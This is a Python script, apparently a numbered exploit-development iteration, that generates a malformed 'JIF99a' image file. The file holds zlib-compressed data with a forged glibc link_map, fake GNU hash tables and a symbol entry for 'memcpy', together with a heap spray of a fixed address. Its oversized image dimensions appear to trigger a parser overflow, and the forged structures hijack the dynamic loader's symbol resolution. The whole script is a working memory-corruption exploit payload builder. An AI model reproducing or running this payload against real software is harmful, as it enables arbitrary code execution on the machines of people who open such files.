#!/usr/bin/env python3
"""W358: coherent fake link_map selected by a phase-dependent l_real cell.

ARRBASE = idx + delta, so the loader array is at a fixed output offset; its
entries point at one fixed address M.  Only *(M+0x28) (l_real) is read from
that cell.  For each 16-byte idx phase k we write M_k into that cell at the
output offset that lands on M+0x28 in phase k, and build a full coherent map
at M_k using offsets for that same phase.  No two fields share a lane, so
unlike a repeating pattern the map stays coherent.

Usage: w358-phaseidx.py OUT [NOISE] [K] [SPACING]
"""
import struct
import sys
import zlib

out = sys.argv[1]
noise = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0
K = int(sys.argv[3], 0) if len(sys.argv) > 3 else 0x30
spacing = int(sys.argv[4], 0) if len(sys.argv) > 4 else 0x600
idx_nom = int(sys.argv[5], 16) if len(sys.argv) > 5 else 0x555555678f00
delta = 0x47210                          # W351 band; swept across below
M = (idx_nom + delta - 0x20000) & ~0xf
base = M - idx_nom
hash_ = 0x0d827590                       # new_hash("memcpy"), W355
slots = 64
arr_lo, arr_hi = delta - 0x800, delta + slots * 8 + 0x800
plain = bytearray([0x4d]) * (arr_hi + 0x800)

if noise:
    s = 0x2545f4914f6cdd1d
    for j in range(0x3e000, 0x3e000 + noise):
        s = (s * 6364136223846793005 + 1442695040888963407) & ((1 << 64) - 1)
        plain[j] = (s >> 33) & 0xff


def put(off, raw):
    if off < 0 or off + len(raw) > len(plain):
        raise ValueError(hex(off))
    plain[off:off + len(raw)] = raw


def q(v):
    return struct.pack("<Q", v & 0xffffffffffffffff)


def w(v):
    return struct.pack("<I", v & 0xffffffff)


for k in range(K + 1):
    mk = M + spacing * k
    sh = 16 * k
    fb = base + spacing * k - sh          # field base for this phase

    def f(fo, raw):
        put(fb + fo, raw)

    # Coherent fake link_map: every field used by do_lookup_x/check_match.
    f(0x000, q(0))                        # l_addr
    f(0x028, q(mk))                       # l_real
    f(0x068, q(mk + 0x4d0))               # l_info[DT_STRTAB]
    f(0x070, q(mk + 0x4e0))               # l_info[DT_SYMTAB]
    f(0x32c, w(1))                        # l_nbuckets
    f(0x330, w(0))                        # l_gnu_bitmask_idxbits
    f(0x334, w(0))                        # l_gnu_shift
    f(0x338, q(mk + 0x4a0))               # l_gnu_bitmask
    f(0x340, q(mk + 0x4b0))               # l_gnu_buckets
    f(0x348, q(mk + 0x4c0))               # l_gnu_chain_zero
    f(0x354, w(0))                        # l_type, l_removed, ...
    f(0x380, q(0))                        # l_versyms
    f(0x414, w(0))                        # l_used store target
    f(0x4a0, q(1 << 16))                  # GNU bitmask word
    f(0x4b0, w(1))                        # bucket[0]
    f(0x4c0, w(hash_ | 1))                # chain[1] matches new_hash
    f(0x4d0, q(5))                        # Dyn DT_STRTAB
    f(0x4d8, q(mk + 0x500))
    f(0x4e0, q(6))                        # Dyn DT_SYMTAB
    f(0x4e8, q(mk + 0x520))
    f(0x500, b"\x00memcpy\x00")           # strtab
    sym = struct.pack("<IBBHQQ", 1, 0x12, 0, 1, mk + 0x600, 8)
    f(0x538, sym[0:8])
    f(0x540, sym[8:16])
    f(0x548, sym[16:24])
    # The one fixed-address cell read from the array's target map.
    put(base + 0x28 - sh, q(mk))

# ARRBASE = idx + delta; write M at every byte-offset in the measured delta
# sweep so the exact array slot is covered regardless of zlen-driven delta.
for off in range(arr_lo, arr_hi, 8):
    put(off, q(M))

z = zlib.compress(bytes(plain), 9)
chunks = b"".join(bytes([len(z[i:i + 255])]) + z[i:i + 255]
                  for i in range(0, len(z), 255)) + b"\x00"
LEN, HEIGHT = 33025, 65026
gce = b"\x21\xf9\x04\x01\x00\x00\x00\x00"
jif = (b"JIF99a" + struct.pack("<HHBBB", LEN, HEIGHT, 0, 0, 0) + gce
       + b"\x2c" + struct.pack("<HHHHB", 0, 0, LEN, HEIGHT, 0) + b"\x08"
       + chunks + b"\x3b")
with open(out, "wb") as fd:
    fd.write(jif)
print("WROTE %s M=%#x base=%#x K=%#x spacing=%#x plain=%#x zlen=%d "
      "file=%d pathlen=%d" %
      (out, M, base, K, spacing, len(plain), len(z), len(jif), len(out)))
